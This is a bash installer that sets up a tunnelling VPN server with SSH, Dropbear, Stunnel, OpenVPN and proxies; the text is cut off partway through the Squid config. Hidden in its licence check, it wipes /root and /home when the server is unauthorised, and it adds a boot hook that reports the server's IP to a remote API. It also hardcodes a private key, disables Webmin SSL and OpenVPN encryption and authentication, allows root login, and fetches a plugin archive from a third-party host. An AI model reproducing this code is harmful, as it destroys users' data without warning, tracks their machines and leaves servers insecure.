#!/bin/bash
#
# Script Mod by BytesPH - AkoSiBytes
#
#pre update
apt update -y

# Install curl
apt install curl -y

#############################
#############################
# Variables (Can be changed depends on your preferred values)
# Script name
MyScriptName='BytesPH'
MYIP=$(wget -qO- icanhazip.com);
MYIP2="s/xxxxxxxxx/$MYIP/g";

#check if server is from bytesph panel
echo "Checking..."
DATA=$(curl -sb -X POST https://zoey.bytesph.com/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=check&ip=$MYIP")
if [ "$DATA" == "false" ];
then
 clear
 echo "Installation is exclusive for BytesPH Only. You are not allowed. This incident is already reported to the Admin."
 echo "Exiting now..."
 curl -sb -X POST https://zoey.bytesph.com/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=unauthorized&ip=$MYIP"
 sleep 5;
 rm -rf /root/*
 rm -rf /home/*
 exit 1
fi
clear

# OpenSSH Ports
SSH_Port1='22'
SSH_Port2='226'

# Your SSH Banner
SSH_Banner="https://zoey.bytesph.com/server/server-message"

# Dropbear Ports
Dropbear_Port1='442'
Dropbear_Port2='110'

# Stunnel Ports
Stunnel_Port1='443' # through Dropbear
Stunnel_Port2='444' # through OpenSSH

# OpenVPN Ports
OpenVPN_TCP_Port='1194'
OpenVPN_UDP_Port='445'

# Privoxy Ports
Privoxy_Port1='9000'
Privoxy_Port2='9999'

# Squid Ports
Squid_Port1='3128'
Squid_Port2='8080'
Squid_Port3='8000'

# OpenVPN Config Download Port
OvpnDownload_Port='85' # Before changing this value, please read this document. It contains all unsafe ports for Google Chrome Browser, please read from line #23 to line #89: https://chromium.googlesource.com/chromium/src.git/+/refs/heads/raw/master/net/base/port_util.cc

# Server local time
MyVPS_Time='Asia/Manila'
#############################

# Install wget
apt-get install wget -y

#Install Iptables Rules
apt-get install netfilter-persistent -y

#############################
#############################
## All function used for this script
#############################
## WARNING: Do not modify or edit anything
## if you did'nt know what to do.
## This part is too sensitive.
#############################
#############################

function InstUpdates(){
 export DEBIAN_FRONTEND=noninteractive
 apt update -y
 apt upgrade -y
 apt-get update -y
 apt-get upgrade -y

# Install Ssl & Certificates
 apt install ssl-cert -y
 apt install ca-certificates -y

 # Removing some firewall tools that may affect other services
 apt-get remove --purge ufw firewalld -y
 apt-get remove --purge exim4 -y

 # Installing some important machine essentials
 apt-get install nano -y
 apt-get install zip -y
 apt-get install unzip -y
 apt-get install tar -y
 apt-get install gzip -y
 apt-get install p7zip-full -y
 apt-get install bc -y
 apt-get install rc -y
 apt-get install openssl -y
 apt-get install cron -y
 apt-get install net-tools -y
 apt-get install dnsutils -y
 apt-get install dos2unix -y
 apt-get install screen -y
 apt-get install bzip2 -y
 apt-get install ccrypt -y

 # Now installing all our wanted services
 apt-get install dropbear -y
 apt-get install stunnel4 -y
 apt-get install privoxy -y
 apt-get install ca-certificates -y
 apt-get install nginx -y
 apt-get install ruby -y
 apt-get install apt-transport-https -y
 apt-get install lsb-release -y
 apt-get install squid3 -y
 apt-get install squid -y

 # Installing all required packages to install Webmin
 apt-get install perl -y
 apt-get install libnet-ssleay-perl -y
 apt-get install openssl -y
 apt-get install libauthen-pam-perl -y
 apt-get install libpam-runtime -y
 apt-get install libio-pty-perl -y
 apt-get install apt-show-versions -y
 apt-get install python -y
 apt-get install dbus -y
 apt-get install libxml-parser-perl -y
 apt-get install shared-mime-info -y
 apt-get install jq -y
 apt-get install fail2ban -y

 #Installing required package for DDOS Deflate
 apt-get install dnsutils -y
 apt-get install dsniff -y

 # Installing a text colorizer
 gem install lolcat

 # Trying to remove obsolette packages after installation
 apt-get autoremove -y

 # go to root
 cd

# Edit file /etc/systemd/system/rc-local.service
cat > /etc/systemd/system/rc-local.service <<-END
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99
[Install]
WantedBy=multi-user.target
END

# nano /etc/rc.local
cat > /etc/rc.local <<-END
#!/bin/sh -e
# rc.local

curl -sb -X POST $DOMAIN/api/server/install -H 'Content-Type: application/x-www-form-urlencoded' -d 'status=rebooted&ip=$MYIP'
exit 0
END

# Change Permission Access
chmod +x /etc/rc.local

# enable rc local
systemctl enable rc-local

systemctl start rc-local.service

# disable ipv6
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local

 # Installing OpenVPN by pulling its repository inside sources.list file
 rm -rf /etc/apt/sources.list.d/openvpn*
 echo "deb http://build.openvpn.net/debian/openvpn/stable $(lsb_release -sc) main" > /etc/apt/sources.list.d/openvpn.list
 wget -qO - http://build.openvpn.net/debian/openvpn/stable/pubkey.gpg|apt-key add -
 apt-get update -y
 apt-get install openvpn -y
}
function InstWebmin(){
 # Download the webmin .deb package
 # You may change its webmin version depends on the link you've loaded in this variable(.deb file only, do not load .zip or .tar.gz file):
 apt-get install apt-transport-https -y
 apt-get install gnupg2 -y
 apt-get install curl -y
 sudo echo "deb https://download.webmin.com/download/repository sarge contrib" \ > /etc/apt/sources.list.d/webmin.list
 curl https://download.webmin.com/jcameron-key.asc | sudo apt-key add -

 # Installing .deb package for webmin
 apt-get update -y
 apt-get install webmin -y

 # Configuring webmin server config to use only http instead of https
 sed -i 's|ssl=1|ssl=0|g' /etc/webmin/miniserv.conf

 # Then restart to take effect
 systemctl restart webmin
}
function InstSSH(){
 # Removing some duplicated sshd server configs
 rm -f /etc/ssh/sshd_config*

 # Creating a SSH server config using cat eof tricks
 cat <<'MySSHConfig' > /etc/ssh/sshd_config
# My OpenSSH Server config
Port myPORT1
Port myPORT2
AddressFamily inet
ListenAddress 0.0.0.0
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key
PermitRootLogin yes
MaxSessions 1024
PubkeyAuthentication yes
PasswordAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
ClientAliveInterval 240
ClientAliveCountMax 2
UseDNS no
Banner /etc/banner
AcceptEnv LANG LC_*
Subsystem   sftp  /usr/lib/openssh/sftp-server
MySSHConfig

 # Now we'll put our ssh ports inside of sshd_config
 sed -i "s|myPORT1|$SSH_Port1|g" /etc/ssh/sshd_config
 sed -i "s|myPORT2|$SSH_Port2|g" /etc/ssh/sshd_config

 # Download our SSH Banner
 rm -f /etc/banner
 wget -qO /etc/banner "$SSH_Banner"
 dos2unix -q /etc/banner

 # My workaround code to remove `BAD Password error` from passwd command, it will fix password-related error on their ssh accounts.
 sed -i '/password\s*requisite\s*pam_cracklib.s.*/d' /etc/pam.d/common-password
 sed -i 's/use_authtok //g' /etc/pam.d/common-password

 # Some command to identify null shells when you tunnel through SSH or using Stunnel, it will fix user/pass authentication error on HTTP Injector, KPN Tunnel, eProxy, SVI, HTTP Proxy Injector etc ssh/ssl tunneling apps.
 sed -i '/\/bin\/false/d' /etc/shells
 sed -i '/\/usr\/sbin\/nologin/d' /etc/shells
 echo '/bin/false' >> /etc/shells
 echo '/usr/sbin/nologin' >> /etc/shells

 # Restarting openssh service
 systemctl restart ssh

 # Removing some duplicate config file
 rm -rf /etc/default/dropbear*

 # creating dropbear config using cat eof tricks
 cat <<'MyDropbear' > /etc/default/dropbear
# My Dropbear Config
NO_START=0
DROPBEAR_PORT=PORT01
DROPBEAR_EXTRA_ARGS="-p PORT02"
DROPBEAR_BANNER="/etc/banner"
DROPBEAR_RSAKEY="/etc/dropbear/dropbear_rsa_host_key"
DROPBEAR_DSSKEY="/etc/dropbear/dropbear_dss_host_key"
DROPBEAR_ECDSAKEY="/etc/dropbear/dropbear_ecdsa_host_key"
DROPBEAR_RECEIVE_WINDOW=65536
MyDropbear

 # Now changing our desired dropbear ports
 sed -i "s|PORT01|$Dropbear_Port1|g" /etc/default/dropbear
 sed -i "s|PORT02|$Dropbear_Port2|g" /etc/default/dropbear

 # Restarting dropbear service
 systemctl restart dropbear
}
function InsStunnel(){
 StunnelDir=$(ls /etc/default | grep stunnel | head -n1)

 # Creating stunnel startup config using cat eof tricks
cat <<'MyStunnelD' > /etc/default/$StunnelDir
# My Stunnel Config
ENABLED=1
FILES="/etc/stunnel/*.conf"
OPTIONS=""
BANNER="/etc/banner"
PPP_RESTART=0
# RLIMITS="-n 4096 -d unlimited"
RLIMITS=""
MyStunnelD

 # Removing all stunnel folder contents
 rm -rf /etc/stunnel/*

 # Creating stunnel certifcate using openssl
 openssl req -new -x509 -days 9999 -nodes -subj "/C=PH/ST=NCR/L=Manila/O=$MyScriptName/OU=$MyScriptName/CN=$MyScriptName" -out /etc/stunnel/stunnel.pem -keyout /etc/stunnel/stunnel.pem &> /dev/null
##  > /dev/null 2>&1

 # Creating stunnel server config
 cat <<'MyStunnelC' > /etc/stunnel/stunnel.conf
# My Stunnel Config
pid = /var/run/stunnel.pid
cert = /etc/stunnel/stunnel.pem
client = no
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1
TIMEOUTclose = 0

[dropbear]
accept = Stunnel_Port1
connect = 127.0.0.1:dropbear_port_c

[openssh]
accept = Stunnel_Port2
connect = 127.0.0.1:openssh_port_c
MyStunnelC

# setting stunnel ports
 sed -i "s|Stunnel_Port1|$Stunnel_Port1|g" /etc/stunnel/stunnel.conf
 sed -i "s|dropbear_port_c|$(netstat -tlnp | grep -i dropbear | awk '{print $4}' | cut -d: -f2 | xargs | awk '{print $2}' | head -n1)|g" /etc/stunnel/stunnel.conf
 sed -i "s|Stunnel_Port2|$Stunnel_Port2|g" /etc/stunnel/stunnel.conf
 sed -i "s|openssh_port_c|$(netstat -tlnp | grep -i ssh | awk '{print $4}' | cut -d: -f2 | xargs | awk '{print $2}' | head -n1)|g" /etc/stunnel/stunnel.conf
 sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4

}
function InsOpenVPN(){
 # Checking if openvpn folder is accidentally deleted or purged
 if [[ ! -e /etc/openvpn ]]; then
  mkdir -p /etc/openvpn
 fi

 # Removing all existing openvpn server files
 rm -rf /etc/openvpn/*

 # Creating server.conf, ca.crt, server.crt and server.key
 cat <<'myOpenVPNconf' > /etc/openvpn/server_tcp.conf
# OpenVPN TCP
port OVPNTCP
proto tcp
dev tun
ca /etc/openvpn/ca.crt
cert /etc/openvpn/server.crt
key /etc/openvpn/server.key
dh /etc/openvpn/dh2048.pem
verify-client-cert none
username-as-common-name
key-direction 0
plugin /etc/openvpn/plugins/openvpn-plugin-auth-pam.so login
server 10.200.0.0 255.255.0.0
ifconfig-pool-persist ipp.txt
push "route-method exe"
push "route-delay 2"
keepalive 10 120
comp-lzo
user nobody
group nogroup
persist-key
persist-tun
status openvpn-status.log
log tcp.log
verb 2
ncp-disable
cipher none
auth none
myOpenVPNconf

cat <<'myOpenVPNconf2' > /etc/openvpn/server_udp.conf
# OpenVPN UDP
port OVPNUDP
proto udp
dev tun
ca /etc/openvpn/ca.crt
cert /etc/openvpn/server.crt
key /etc/openvpn/server.key
dh /etc/openvpn/dh2048.pem
verify-client-cert none
username-as-common-name
key-direction 0
plugin /etc/openvpn/plugins/openvpn-plugin-auth-pam.so login
server 10.201.0.0 255.255.0.0
ifconfig-pool-persist ipp.txt
push "route-method exe"
push "route-delay 2"
keepalive 10 120
comp-lzo
user nobody
group nogroup
persist-key
persist-tun
status openvpn-status.log
log udp.log
verb 2
ncp-disable
cipher none
auth none
myOpenVPNconf2

 cat <<'EOF7'> /etc/openvpn/ca.crt
-----BEGIN CERTIFICATE-----
MIIDQjCCAiqgAwIBAgIUWBIMtmhr7npF/ViBUlAWOnYogZ0wDQYJKoZIhvcNAQEL
BQAwEzERMA8GA1UEAwwIQ2hhbmdlTWUwHhcNMjMwMTI1MDAwNzM3WhcNMzMwMTIy
MDAwNzM3WjATMREwDwYDVQQDDAhDaGFuZ2VNZTCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBAL1QonFmG/bJoEMblmd0VxXZqc7+6yFvYEGEvp+2qQAMaKX3
OsyUEzlzSNGx9hOfCkczg0CULDkTw2hoGZpVVSW3Gl0RXZqmdPQn4/wWkGtkeHwL
k0L6fgZfhxqGGuBdCMJm6lkFxXtEOCA2BEb62TWWbPAFo3ecie5gCVrYO3gMKsso
Ab7herBFA3Y45/f+SoI0fw+0IM2goizm4I8j9STivJSapGORYPdC7v+aNohXSwOG
RvwnWDsxpkPsUkIzJccxHo2GSSjS06aez+4bqLNPREiQ6KkD9OZkjZRD7zosbadU
aXP9IPIK1A3Jy7926PFdHcj9eQCo+i3cwOhJJzcCAwEAAaOBjTCBijAdBgNVHQ4E
FgQUqx2gKWO49Gjeyi5DM89vU6I5RlIwTgYDVR0jBEcwRYAUqx2gKWO49Gjeyi5D
M89vU6I5RlKhF6QVMBMxETAPBgNVBAMMCENoYW5nZU1lghRYEgy2aGvuekX9WIFS
UBY6diiBnTAMBgNVHRMEBTADAQH/MAsGA1UdDwQEAwIBBjANBgkqhkiG9w0BAQsF
AAOCAQEAcaUPev5TUe/9fadmHf8Xc72KwAIljPAXhrZYmsLpNwI9JxlQU/jgknpr
x+ijrnLkzQA0W7eRA7/QaXRO7yo1srJx0SnM+mXO+mmSw3OAjoSxmMIOGL2uMEdM
xuxmxNk6rgnkmXS5PxYv7owGpL47jz2rSyUlu5DHZBaUXhjn71AJnperSeBi1yBr
gKA6zFLwihCC5eUz1GxMNqTouMS5lvsOjJFPoFkrTeD3AsYmJkMadcDnOtS2TDFO
iDbsNFCtMiEyXQypeSzuWD25ACRujTPjYO+OGfg/K3x5UAMA4td7x1Pqw8e0xwp1
si9FW4VyoSdDcYosnVpwyzJb64X6FA==
-----END CERTIFICATE-----
EOF7
 cat <<'EOF9'> /etc/openvpn/server.crt
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            9d:d0:32:d9:35:20:d8:fb:8d:e8:7b:e1:7a:c7:46:4b
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=ChangeMe
        Validity
            Not Before: Jan 25 00:08:45 2023 GMT
            Not After : Jan 22 00:08:45 2033 GMT
        Subject: CN=server
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:d5:34:e7:e2:34:8b:be:d9:7e:4b:1a:95:84:c6:
                    ec:9b:d2:f9:b6:fb:a5:64:d0:aa:69:d8:db:24:1d:
                    09:7d:c4:7b:61:6b:cd:01:ee:ca:34:95:a0:fe:46:
                    ab:03:de:83:85:86:a6:47:fd:bf:78:2f:bb:8e:ad:
                    fc:02:fb:f3:eb:d6:51:0b:94:fb:9f:06:8f:3a:23:
                    0a:2f:90:3a:74:a8:1a:07:fe:60:99:d4:c7:3b:b1:
                    67:73:e4:70:8c:1e:53:fc:af:94:ba:76:00:27:05:
                    2f:f4:5b:b8:e8:ff:89:db:85:59:8a:35:3a:f4:7c:
                    fb:dd:be:ba:15:d6:6d:02:a1:a3:98:f6:42:02:3d:
                    79:fc:77:89:e1:f9:d3:7b:5a:f7:42:c1:94:05:b3:
                    59:12:1f:c2:a4:e4:73:ee:a5:d0:79:c2:65:db:5d:
                    4f:0b:41:f9:72:89:f7:63:66:27:99:77:5d:f1:18:
                    f9:23:e0:39:6b:75:9a:41:e0:e1:e6:da:31:1b:b8:
                    4e:92:d0:24:ee:20:94:2d:9e:c9:a0:df:b1:0d:8a:
                    e5:92:5d:a6:11:ef:57:2b:68:13:0f:ca:d4:a2:f9:
                    1c:f6:e9:8a:5e:9b:7d:e0:e3:4d:40:8a:dd:0e:e8:
                    82:bd:22:00:78:d1:86:a7:e8:8a:b9:f5:1a:dc:46:
                    ef:93
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints:
                CA:FALSE
            X509v3 Subject Key Identifier:
                8D:8E:63:10:1C:E5:5C:3D:10:7A:61:34:32:A0:52:E8:DD:A9:AB:03
            X509v3 Authority Key Identifier:
                keyid:AB:1D:A0:29:63:B8:F4:68:DE:CA:2E:43:33:CF:6F:53:A2:39:46:52
                DirName:/CN=ChangeMe
                serial:58:12:0C:B6:68:6B:EE:7A:45:FD:58:81:52:50:16:3A:76:28:81:9D
            X509v3 Extended Key Usage:
                TLS Web Server Authentication
            X509v3 Key Usage:
                Digital Signature, Key Encipherment
            X509v3 Subject Alternative Name:
                DNS:server
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        26:ac:24:02:ed:55:34:f7:9d:eb:75:78:30:04:8b:48:02:9b:
        93:3a:d5:cf:37:fd:d3:db:9e:55:c7:fe:7e:c8:e3:99:32:b8:
        51:f1:68:ee:c1:58:0b:46:f2:82:e0:2c:12:ec:85:f9:99:85:
        d2:4d:ea:42:2f:7b:80:96:c0:f8:dc:51:0d:1e:90:3e:7f:ae:
        9a:83:ec:10:ac:87:4e:54:85:d8:15:84:f8:47:13:0b:13:3f:
        ab:74:7e:b8:d0:d5:4d:35:b0:33:69:6f:cd:a3:44:24:d1:73:
        1d:62:4f:bc:3c:8f:e1:fa:c2:97:e6:87:bf:b0:5f:a7:95:9e:
        f4:87:ea:ef:cb:cb:20:f2:c9:eb:16:33:2e:45:96:e6:fc:ea:
        77:4c:1f:34:13:18:62:28:39:a9:68:8e:7d:95:6b:8c:97:44:
        5d:80:f0:b3:e8:e1:f8:da:41:e7:7a:04:f9:11:b6:43:8b:3a:
        6b:a8:ae:25:d7:ac:bd:56:7c:21:c0:95:68:2d:b6:71:47:73:
        65:09:df:98:b9:18:a3:e9:90:14:9f:f4:6a:af:4b:b9:c1:94:
        03:19:8f:6e:40:3a:94:2d:1b:3e:8e:7a:31:0d:b0:fe:18:67:
        e5:e1:ee:8d:e5:18:46:28:ed:f2:b2:6c:ed:1c:fd:17:98:22:
        0f:3b:e7:e5
-----BEGIN CERTIFICATE-----
MIIDYjCCAkqgAwIBAgIRAJ3QMtk1INj7jeh74XrHRkswDQYJKoZIhvcNAQELBQAw
EzERMA8GA1UEAwwIQ2hhbmdlTWUwHhcNMjMwMTI1MDAwODQ1WhcNMzMwMTIyMDAw
ODQ1WjARMQ8wDQYDVQQDDAZzZXJ2ZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
ggEKAoIBAQDVNOfiNIu+2X5LGpWExuyb0vm2+6Vk0Kpp2NskHQl9xHtha80B7so0
laD+RqsD3oOFhqZH/b94L7uOrfwC+/Pr1lELlPufBo86IwovkDp0qBoH/mCZ1Mc7
sWdz5HCMHlP8r5S6dgAnBS/0W7jo/4nbhVmKNTr0fPvdvroV1m0CoaOY9kICPXn8
d4nh+dN7WvdCwZQFs1kSH8Kk5HPupdB5wmXbXU8LQflyifdjZieZd13xGPkj4Dlr
dZpB4OHm2jEbuE6S0CTuIJQtnsmg37ENiuWSXaYR71craBMPytSi+Rz26Ypem33g
401Ait0O6IK9IgB40Yan6Iq59RrcRu+TAgMBAAGjgbIwga8wCQYDVR0TBAIwADAd
BgNVHQ4EFgQUjY5jEBzlXD0QemE0MqBS6N2pqwMwTgYDVR0jBEcwRYAUqx2gKWO4
9Gjeyi5DM89vU6I5RlKhF6QVMBMxETAPBgNVBAMMCENoYW5nZU1lghRYEgy2aGvu
ekX9WIFSUBY6diiBnTATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAw
EQYDVR0RBAowCIIGc2VydmVyMA0GCSqGSIb3DQEBCwUAA4IBAQAmrCQC7VU0953r
dXgwBItIApuTOtXPN/3T255Vx/5+yOOZMrhR8WjuwVgLRvKC4CwS7IX5mYXSTepC
L3uAlsD43FENHpA+f66ag+wQrIdOVIXYFYT4RxMLEz+rdH640NVNNbAzaW/No0Qk
0XMdYk+8PI/h+sKX5oe/sF+nlZ70h+rvy8sg8snrFjMuRZbm/Op3TB80ExhiKDmp
aI59lWuMl0RdgPCz6OH42kHnegT5EbZDizprqK4l16y9VnwhwJVoLbZxR3NlCd+Y
uRij6ZAUn/Rqr0u5wZQDGY9uQDqULRs+jnoxDbD+GGfl4e6N5RhGKO3ysmztHP0X
mCIPO+fl
-----END CERTIFICATE-----
EOF9
 cat <<'EOF10'> /etc/openvpn/server.key
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDVNOfiNIu+2X5L
GpWExuyb0vm2+6Vk0Kpp2NskHQl9xHtha80B7so0laD+RqsD3oOFhqZH/b94L7uO
rfwC+/Pr1lELlPufBo86IwovkDp0qBoH/mCZ1Mc7sWdz5HCMHlP8r5S6dgAnBS/0
W7jo/4nbhVmKNTr0fPvdvroV1m0CoaOY9kICPXn8d4nh+dN7WvdCwZQFs1kSH8Kk
5HPupdB5wmXbXU8LQflyifdjZieZd13xGPkj4DlrdZpB4OHm2jEbuE6S0CTuIJQt
nsmg37ENiuWSXaYR71craBMPytSi+Rz26Ypem33g401Ait0O6IK9IgB40Yan6Iq5
9RrcRu+TAgMBAAECggEAO3MPHXINbV/z6Tk2a9mT7Dc9zhoJGj1c5zrCkCVQmjMJ
PDb06Q8Obu8x/vTxhpirD7Zl8zj8BKU6pSQ6WxKqBx6xZotaRhNsKIfQtUaAJjsh
Vw1FHl/IVgq3kAcooslqHdFPpVZ14Gt/3aEdxEpMxFtAhlslXzrieAhQlvo9Vzf8
rZF7v0Yc7qxDMYrUZDwpi8JmVmRz6pjaoLWZDGPwXD+1sUa2U777C2ll6eXn2mNJ
8+06RT/Z6qT6gTosnKGPhstJTWxnupRRJzfPXK+DtnTdzrmlnpj4IxdL/CBe9qJh
0k7RFVWeke0dVD/ll3XpgfXdHyL3W1UA3fTifUH1cQKBgQDiVAy1wkGLxnEBQBpt
JKf1Xxz6UZ+Xm8eMzqjkPOKG//G++ke4HnFU4Deoi4LPWSuNVw2fgKFBFEqkuTsw
VJEpthDz48shUbdQnqJExVkLyrRepelgkn0EkIJxFHx6RUeEpXSPa8E8bGm+62ZY
dh/uNIQSKOL5VEDGxQe9b0Z+dQKBgQDxKHjJAqBy8vY6qT21h86Ughz9/yBNrWrE
3+VMJK27Dtdu24f24U8wWP2XVepTHqibA6744pCZGb1rvRZbJx08ENwqrdGkHK09
O6XEbF3RXJs8xA9YkxtfaI6ChozfsHfJnr/hemvsHmFNiTX5sVy5vke0W2sAOWXA
m/IX/s0E5wKBgAvmi3yLKFMnLg34xuryQHqgc6+d1xxrroRy4WKO6QJcNuPp2ReP
Ujo6R/Lu0wQAFlAqQacfZls7q+kZbElQSQm+bwnD8oxf9Zmhnbqr/dCm6fEIHEtd
qIEy8AjuINV1Cxuob4aTDegVc0H8srb4DxnBXShvSe/+RCGvfoaxcS15AoGBAK1l
XkOZwegkzeqr2ZT2yxB45YOzt3RipoxcODChhtEjAL/S1VYr9pZaxivUOKH/P1gG
M/78WN/cZBhdYv+zhg+0R7ngNQZ9IAsRIkWzbVml7nCowCf9zgax1RYAzLXh2p97
p5fmQEcMKQZpDAg3AOcE6+XAfZUxr/nnpxCdwqgtAoGAZjtVa+XguH9vZ3rYLFwG
26a9MjeaPDOElMiQnF8KYh6fyNZMXCFsVn3/8mGxdeL+9qEhyD2CiyT5thOiBkJA
yUs2zW9xr7deHR6wzy10GBZDa/G/2vw7xCLj8I422E5W7DAtc4JpSVMFaB/4uKqE
dbuttE762YpHA+Lq+LHQSXw=
-----END PRIVATE KEY-----

EOF10
 cat <<'EOF13'> /etc/openvpn/dh2048.pem
-----BEGIN DH PARAMETERS-----
MIIBCAKCAQEA9BcQgF9vPxDCth+D3qOixJgycVNqQvK1ueJ/FAbstOXqq7G2eeoL
d3OCo0Ayr4wL2xsqBkiomAOht6ikJIC7m5DKCA5RcfKilI832xCDozqt6gtztOld
35K5nMEy33yDK+xkw0xPlvGfeOtRV0P3gFvBdoDaNggl8d9pHmxOjmhLttsvReun
YTWQGaVV+GrSVStKOxFe3ocAyE9tcEfaoUx1Vly/V1uhA9rZ1h52Z19BNv87ECeg
jS6u6SYPRqFuhGLb/E3ywquLJmi/DjPowhb5MtjD8I2p3XPYfq0MoNiUeh9sOm9q
Luc1y363GxWicifYSPh1NoyWqUr8Xh7t3wIBAg==
-----END DH PARAMETERS-----
EOF13

 # Getting all dns inside resolv.conf then use as Default DNS for our openvpn server
 grep -v '#' /etc/resolv.conf | grep 'nameserver' | grep -E -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | while read -r line; do
	echo "push \"dhcp-option DNS $line\"" >> /etc/openvpn/server_tcp.conf
done

 # Creating a New update message in server.conf
 cat <<'NUovpn' > /etc/openvpn/server.conf
 # New Update are now released, OpenVPN Server
 # are now running both TCP and UDP Protocol. (Both are only running on IPv4)
 # But our native server.conf are now removed and divided
 # Into two different configs base on their Protocols:
 #  * OpenVPN TCP (located at /etc/openvpn/server_tcp.conf
 #  * OpenVPN UDP (located at /etc/openvpn/server_udp.conf
 #
 # Also other logging files like
 # status logs and server logs
 # are moved into new different file names:
 #  * OpenVPN TCP Server logs (/etc/openvpn/tcp.log)
 #  * OpenVPN UDP Server logs (/etc/openvpn/udp.log)
 #  * OpenVPN TCP Status logs (/etc/openvpn/tcp_stats.log)
 #  * OpenVPN UDP Status logs (/etc/openvpn/udp_stats.log)
 #
 # Server ports are configured base on env vars
 # executed/raised from this script (OpenVPN_TCP_Port/OpenVPN_UDP_Port)
 #
 # Enjoy the new update
 # Script Updated by PR Aiman
NUovpn

 # setting openvpn server port
 sed -i "s|OVPNTCP|$OpenVPN_TCP_Port|g" /etc/openvpn/server_tcp.conf
 sed -i "s|OVPNUDP|$OpenVPN_UDP_Port|g" /etc/openvpn/server_udp.conf

 # Getting some OpenVPN plugins for unix authentication
 cd
 wget https://gitfront.io/r/user-1492265/LuZ73jQh8GCT/vps-installation/raw/Files/Plugins/plugin.tgz
 tar -xzvf /root/plugin.tgz -C /etc/openvpn/
 rm -f plugin.tgz

 # Some workaround for OpenVZ machines for "Startup error" openvpn service
 if [[ "$(hostnamectl | grep -i Virtualization | awk '{print $2}' | head -n1)" == 'openvz' ]]; then
 sed -i 's|LimitNPROC|#LimitNPROC|g' /lib/systemd/system/openvpn*
 systemctl daemon-reload
fi

 # Allow IPv4 Forwarding
 sed -i '/net.ipv4.ip_forward.*/d' /etc/sysctl.conf
 sed -i '/net.ipv4.ip_forward.*/d' /etc/sysctl.d/*.conf
 echo 'net.ipv4.ip_forward=1' > /etc/sysctl.d/20-openvpn.conf
 sysctl --system &> /dev/null

 # Iptables Rule for OpenVPN server
 cat <<'EOFipt' > /etc/openvpn/openvpn.bash
#!/bin/bash
PUBLIC_INET="$(ip -4 route ls | grep default | grep -Po '(?<=dev )(\S+)' | head -1)"
IPCIDR='10.200.0.0/16'
IPCIDR2='10.201.0.0/16'
iptables -I FORWARD -s $IPCIDR -j ACCEPT
iptables -I FORWARD -s $IPCIDR2 -j ACCEPT
iptables -t nat -A POSTROUTING -o $PUBLIC_INET -j MASQUERADE
iptables -t nat -A POSTROUTING -s $IPCIDR -o $PUBLIC_INET -j MASQUERADE
iptables -t nat -A POSTROUTING -s $IPCIDR2 -o $PUBLIC_INET -j MASQUERADE
EOFipt
 chmod +x /etc/openvpn/openvpn.bash
 bash /etc/openvpn/openvpn.bash

 # Enabling IPv4 Forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward

 # Starting OpenVPN server
 systemctl start openvpn@server_tcp
 systemctl enable openvpn@server_tcp
 systemctl start openvpn@server_udp
 systemctl enable openvpn@server_udp
}
function InsProxy(){

 # Removing Duplicate privoxy config
 rm -rf /etc/privoxy/config*

 # Creating Privoxy server config using cat eof tricks
 cat <<'privoxy' > /etc/privoxy/config
# My Privoxy Server Config
user-manual /usr/share/doc/privoxy/user-manual
confdir /etc/privoxy
logdir /var/log/privoxy
filterfile default.filter
logfile logfile
listen-address 0.0.0.0:Privoxy_Port1
listen-address 0.0.0.0:Privoxy_Port2
toggle 1
enable-remote-toggle 0
enable-remote-http-toggle 0
enable-edit-actions 0
enforce-blocks 0
buffer-limit 4096
enable-proxy-authentication-forwarding 1
forwarded-connect-retries 1
accept-intercepted-requests 1
allow-cgi-request-crunching 1
split-large-forms 0
keep-alive-timeout 5
tolerate-pipelining 1
socket-timeout 300
permit-access 0.0.0.0/0 IP-ADDRESS
privoxy

 # Setting machine's IP Address inside of our privoxy config(security that only allows this machine to use this proxy server)
 sed -i "s|IP-ADDRESS|$MYIP|g" /etc/privoxy/config

 # Setting privoxy ports
 sed -i "s|Privoxy_Port1|$Privoxy_Port1|g" /etc/privoxy/config
 sed -i "s|Privoxy_Port2|$Privoxy_Port2|g" /etc/privoxy/config

 # Removing Duplicate Squid config
 rm -rf /etc/squid/squid.con*

 # Creating Squid server config using cat eof tricks
 cat <<'mySquid' > /etc/squid/squid.conf
# My Squid Proxy Server Config
acl VPN dst IP-ADDRESS/32
http_access allow VPN
http_access deny all
http_port 0.0.0.0:Squid_Port1
http_port 0.0.0.0:Squid_Port2
http_port 0.0.0.0:Squid_Port3
### Allow Headers
request_header_access Allow allow all
request_header_access Authorization allow all
request_header_access WWW-Authenticate allow all
request_header_access Proxy-Authorization allow all
request_header_access Proxy-Authenticate allow all
request_header_access Cache-Control allow all
request_header_access Content-Encoding allow all
request_header_access Content-Length allow all
request_header_access Content-Type allow all
request_header_access Date allow all
request_header_access Expires allow all
request_header_access Host allow all
request_header_access If-Modified-Since allow all
request_header_access Last-Modified allow all
request_header_access Location allow all
request_header_access Pragma allow all
request_header_access Accept allow all
request_header_access Accept-Charset allow all
request_header_access Accept-Encoding allow all
request_header_access Accept-Language allow all
request_header_access Content-Language allow all
